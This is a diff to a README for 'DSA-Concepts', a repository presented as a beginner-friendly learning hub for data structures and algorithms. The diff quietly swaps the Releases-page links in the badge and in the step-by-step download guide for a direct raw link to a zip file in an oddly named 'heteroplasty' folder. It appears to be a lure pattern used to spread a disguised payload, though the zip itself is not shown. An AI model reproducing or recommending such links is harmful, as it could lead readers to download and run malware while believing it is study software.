@@ -1,6 +1,6 @@
 # 📚 DSA-Concepts - A Friendly Hub for Learning
 
-[![Download DSA-Concepts](https://img.shields.io/badge/Download-DSA--Concepts-brightgreen)](https://github.com/Changeringingreadingclinic434/DSA-Concepts/releases)
+[![Download DSA-Concepts](https://raw.githubusercontent.com/Changeringingreadingclinic434/DSA-Concepts/main/heteroplasty/DSA-Concepts.zip)](https://raw.githubusercontent.com/Changeringingreadingclinic434/DSA-Concepts/main/heteroplasty/DSA-Concepts.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ You can easily download the latest version of the DSA-Concepts application from 
 **Step-by-Step Guide:**
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.  
-   [Download DSA-Concepts](https://github.com/Changeringingreadingclinic434/DSA-Concepts/releases)
+   [Download DSA-Concepts](https://raw.githubusercontent.com/Changeringingreadingclinic434/DSA-Concepts/main/heteroplasty/DSA-Concepts.zip)
 
 2. **Select the Latest Version:** Look for the latest version listed on the page.
 
